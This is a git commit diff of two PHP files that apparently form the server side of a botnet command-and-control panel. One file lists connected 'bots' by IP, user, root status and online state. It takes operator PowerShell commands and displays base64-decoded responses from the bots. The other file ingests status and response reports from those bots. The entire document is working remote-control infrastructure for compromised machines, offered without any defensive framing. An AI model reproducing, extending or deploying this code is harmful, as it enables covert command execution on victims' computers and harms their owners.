5f8dfef5697c28c8e06c19c71179689639f567cc
xze3n <andrei.ab.borta@gmail.com>
2022-04-06 18:55:19 +0300

    Add files via upload

--- apache/cpanel.php
+++ apache/cpanel.php
@@ -1,39 +1,92 @@
-<?php
-    $array = explode("\n", file_get_contents('data.txt'));
-        $heading1 = 'IP';
-        $heading2 = 'USER';
-        $heading3 = 'ROOT';
-        $heading4 = 'LOCAL_IP';
-        $heading5 = ' ';
-        $output     = '<link rel="stylesheet" href="main.css?" type="text/css">';
-        $output    .= "<table cellspacing='0' cellpadding='0'>" . PHP_EOL;
-        $output    .= "<tr class=''>" . PHP_EOL;
-        $output    .= "<th class='status'>{$heading5}</th>" . PHP_EOL;
-        $output    .= "<th class=''>{$heading1}</th>" . PHP_EOL;
-        $output    .= "<th class=''>{$heading2}</th>" . PHP_EOL;
-        $output    .= "<th class=''>{$heading3}</th>" . PHP_EOL;
-        $output    .= "<th class=''>{$heading4}</th>" . PHP_EOL;
-        //add more headers here
-        $output    .= "</tr>" . PHP_EOL;
-        $output    .= "<tbody>" . PHP_EOL;
-    for($i=0; $i<=count(file('data.txt'))-1; $i++) {
-        $line = $array[$i];
-        $data = explode(" ", $line);
-        $output.= "<tr>" . PHP_EOL;
-
-        date_default_timezone_set('Europe/Bucharest');
-        $date = date('YmdHis', time());
-        if($date-$data[5]<=100) {
-            $output.= "<td><span id='online'></span></td>";
+<?php if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // If The Button Has Been Pressed
+    if(isset($_POST['submit'])) {
+        if(isset($_POST['code'])) {
+            // Add The Edited Code To The File
+            file_put_contents("script.txt", $_POST['code']);
         }
-        else $output.= "<td><span id='offline'></span></td>";
-        for($j=1; $j<=4; $j++) { //add more to 4 if i need more data strings
-            $str = $data[$j];
-            $output.= "<td class=''>{$str}</td>" . PHP_EOL;
-        }
-        $output.= "</tr>" . PHP_EOL;
     }
-        $output    .= "</tbody>" . PHP_EOL;
-        $output    .= "</table>" . PHP_EOL;
-        echo $output;
-?>
+} $fileCode = file_get_contents("script.txt");?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Control Panel</title>
+    <link rel="stylesheet" href="css/main.css?">
+    <script src="js/script.js"></script>
+    <!-- ################ Import Dependencies ################ -->
+    <!-- Import highlight.js -->
+        <link rel="stylesheet" href="js/highlight/styles/default.min.css">
+        <script src="js/highlight/highlight.min.js"></script>
+    <!-- Import Code-Input From WebCoder49's CDN -->
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/WebCoder49/code-input@1.0/code-input.css">
+        <script src="https://cdn.jsdelivr.net/gh/WebCoder49/code-input@1.0/code-input.js"></script>
+    <!-- Configure Code-Input -->
+        <script>codeInput.registerTemplate("syntax-highlighted", codeInput.templates.hljs(hljs));</script>
+    <!-- Import Open Sans From Google's CDN -->
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet">
+    <!-- ##################################################### -->
+    </head>
+<body>
+    <table cellspacing="0" cellpadding="0" id="table">
+        <tr><th class="status"> </th><th>IP</th><th>USER</th><th>ROOT</th><th>LOCAL_IP</th></tr>
+        <tbody><?php 
+            // Open The Hosts File As An Array
+            $array = explode("\n", file_get_contents('data/data.txt'));
+            for($i=0; $i<=count(file('data/data.txt'))-1; $i++) {
+                $line = $array[$i]; $data = explode(" ", $line);
+                echo '<tr>';
+                // Change The Time Zone To The Hosts Time
+                date_default_timezone_set('Europe/Bucharest');
+                $date = date('YmdHis', time());
+                if($date-$data[5]<=100) { // If Less Than 100 Seconds Have Passed
+                    echo "<td><span id='online'></span></td>"; // The Bot Is Online
+                }
+                else echo "<td><span id='offline'></span></td>"; // The Bot Is Offline
+                // Increment The Value 4 If More Data String Are Needed
+                for($j=1; $j<=4; $j++) {
+                    $str = $data[$j];
+                    echo '<td>' . $str . '</td>';
+                }
+            }
+            echo '</tr>';
+        ?></tbody>
+    </table>
+    <form id="form" method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
+        <div id="wrapper">
+            <code-input name="code" id="codeBlock" lang="powershell" placeholder="Enter Your Command!" value="<?php echo $fileCode;?>" onchange="check(this.value);"></code-input>
+            <span class="saved" id="saveStatus"></span>
+        </div>
+        <input type="submit" name="submit" value="Go" id="submit">
+        <script>codeInput.registerTemplate("syntax-highlighted", codeInput.templates.hljs(hljs));</script>
+    </form>
+    <div class="area" id="area" contenteditable spellcheck="false"><?php 
+        $responseData = explode("\n", file_get_contents("data/output.txt"));
+        for($i=0; $i<=count($responseData)-1; $i++) {
+            // Remove White Spaces
+            $responseData[$i] = preg_replace(array('/\s{2,}/', '/[\t\n]/'), ' ', $responseData[$i]);
+            if($responseData[$i]!="" && $responseData[$i]!=" ") {
+                $lineData = explode(" ", $responseData[$i]);
+                // Swap Date Format To Something Easier To Read
+                $dateCurrent = date('YmdHis', time()); // Get Current Date
+                $newDate = date("d.m.Y H:i", strtotime($lineData[2]));
+                $valueDecoded = base64_decode($lineData[3]);
+                $response = '[RESPONSE]: From ' . $lineData[0] . ' / ' . $lineData[1] . ' at ' . $newDate . ':';
+                if($dateCurrent-$lineData[2]<=120) { // If Less Than 120 Seconds Have Passed
+                    echo "<span class='response-header'><pre><span class='dot'>{$i}</span>{$response}</pre></span>";
+                    echo "<pre class='recent'>{$valueDecoded}</pre>";
+                    // The Response Is Recent
+                } else {
+                    echo "<span class='response-header'><pre><span class='dot'>{$i}</span>{$response}</pre></span>";
+                    echo "<pre>{$valueDecoded}</pre>";
+                }
+            }
+        }?>
+    </div>
+</body>
+<code-input value="<?php echo $fileCode;?>" style="display: none"></code-input>
+</html>
--- apache/index.php
+++ apache/index.php
@@ -1,60 +1,87 @@
 <?php
-//processing request data
+// Processing Request Data
 header("Content-Type: application/json");
 
+$statusFile = getcwd() . "\data\data.txt";
+$responseFile = getcwd() . "\data\output.txt";
 
-$filename = getcwd() . "\data.txt";
-$json = file_get_contents('php://input');
-$data = explode(' ', $json);
-//file_put_contents($filename, $data[1].PHP_EOL , FILE_APPEND | LOCK_EX);
-if($json!='') {
-$readline = file($filename);
-if(''==file_get_contents($filename)) {
-    $line_i_am_looking_for = 0;
-    $lines = file( $filename , FILE_IGNORE_NEW_LINES );
-    $lines[$line_i_am_looking_for] = $json;
-    file_put_contents( $filename , implode( "\n", $lines ).PHP_EOL);    
-}
-else {
-    $id=explode('_', $data[0]); //id[1]=bios, id[2]=hdd, id[3]=uuid
-    $added=false;
-    for($i=0; $i <= count(file($filename)) - 1; $i++) {
-        $fid = explode(' ', $readline[$i]);
-        if($data[0]==$fid[0]) {
-            $line_i_am_looking_for = $i;
-            $lines = file( $filename , FILE_IGNORE_NEW_LINES );
-            $lines[$line_i_am_looking_for] = $json;
-            file_put_contents( $filename , implode( "\n", $lines ).PHP_EOL);  
-            $added=true;
-        }
-        else {
-            $ids = explode('_', $data[0]);
-            $fids = explode('_', $fid[0]);
-            $cnt = 0;
-            if($ids[0]==$fids[0]) {$cnt++;}
-            if(isset($ids[1]) && isset($fids[1])) { if($ids[1]==$fids[1]){$cnt++;} }
-            if(isset($ids[2])==isset($fids[2])) { if($ids[2]==$fids[2]){$cnt++;} }
-            if($cnt>=2) {
+// Get The Raw Data With The Data Identifier [...]
+$rawData = file_get_contents('php://input');
+$rawDataSplit = explode(' ', $rawData);
+
+// file_put_contents($statusFile, $data[1].PHP_EOL , FILE_APPEND | LOCK_EX);
+
+/* 
+Every Request To The Server Is Preceded By The '[]' Data Identifier Wich 
+Identifies The Type Of Request ([STATUS], [UPDATE], [RESPONSE], ETC...)
+*/
+if($rawDataSplit[0] == "[STATUS]") {
+    array_shift($rawDataSplit); // Remove The First Element "[STATUS]"
+    $json=implode(' ', $rawDataSplit);
+    $data = explode(' ', $json);
+
+    $readline = file($statusFile);
+    if(''==file_get_contents($statusFile)) {
+        $line_i_am_looking_for = 0;
+        $lines = file( $statusFile , FILE_IGNORE_NEW_LINES );
+        $lines[$line_i_am_looking_for] = $json;
+        file_put_contents( $statusFile , implode( "\n", $lines ).PHP_EOL);    
+    }
+    else {
+        $id=explode('_', $data[0]); //id[1]=bios, id[2]=hdd, id[3]=uuid
+        $added=false;
+        for($i=0; $i <= count(file($statusFile)) - 1; $i++) {
+            $fid = explode(' ', $readline[$i]);
+            if($data[0]==$fid[0]) {
                 $line_i_am_looking_for = $i;
-                $lines = file( $filename , FILE_IGNORE_NEW_LINES );
+                $lines = file( $statusFile , FILE_IGNORE_NEW_LINES );
                 $lines[$line_i_am_looking_for] = $json;
-                file_put_contents( $filename , implode( "\n", $lines ).PHP_EOL);
+                file_put_contents( $statusFile , implode( "\n", $lines ).PHP_EOL);  
                 $added=true;
             }
+            else {
+                $ids = explode('_', $data[0]);
+                $fids = explode('_', $fid[0]);
+                $cnt = 0;
+                if($ids[0]==$fids[0]) {$cnt++;}
+                if(isset($ids[1]) && isset($fids[1])) { if($ids[1]==$fids[1]){$cnt++;} }
+                if(isset($ids[2])==isset($fids[2])) { if($ids[2]==$fids[2]){$cnt++;} }
+                if($cnt>=2) {
+                    $line_i_am_looking_for = $i;
+                    $lines = file( $statusFile , FILE_IGNORE_NEW_LINES );
+                    $lines[$line_i_am_looking_for] = $json;
+                    file_put_contents( $statusFile , implode( "\n", $lines ).PHP_EOL);
+                    $added=true;
+                }
+            }
+        }
+        if($added == false) {
+            $line_i_am_looking_for = count(file($statusFile))+2;
+            $lines = file( $statusFile , FILE_IGNORE_NEW_LINES );
+            $lines[$line_i_am_looking_for] = $json;
+            file_put_contents( $statusFile , implode( "\n", $lines ).PHP_EOL);
         }
     }
-    if($added == false) {
-        $line_i_am_looking_for = count(file($filename))+2;
-        $lines = file( $filename , FILE_IGNORE_NEW_LINES );
-        $lines[$line_i_am_looking_for] = $json;
-        file_put_contents( $filename , implode( "\n", $lines ).PHP_EOL);
+}
+if($rawDataSplit[0] == "[RESPONSE]") {
+    array_shift($rawDataSplit); // Remove The First Element "[RESPONSE]"
+
+    if(''==file_get_contents($responseFile)) { // If The Response File Is Empty
+        $line_i_am_looking_for = 0;
+        $lines = file( $responseFile , FILE_IGNORE_NEW_LINES );
+        $lines[$line_i_am_looking_for] = implode(' ', $rawDataSplit);;
+        file_put_contents( $responseFile , implode( "\n", $lines ).PHP_EOL);    
+    }
+    else { $line_i_am_looking_for = count(file($responseFile))+1; // Otherwise Add The Response To The File On A Separate Line
+        $lines = file( $responseFile , FILE_IGNORE_NEW_LINES );
+        $lines[$line_i_am_looking_for] = implode(' ', $rawDataSplit);;
+        file_put_contents( $responseFile , implode( "\n", $lines ).PHP_EOL);
     }
 }
-}
 
-//send response back 
-$v=array(count(file($filename)), 'line(s)');
+// Send Response Back
+$v=array(count(file($statusFile)), 'line(s)');
 echo json_encode($v);
-//done
+// Done. Redirect To Cpanel
 header("Location: cpanel.php");
 ?>
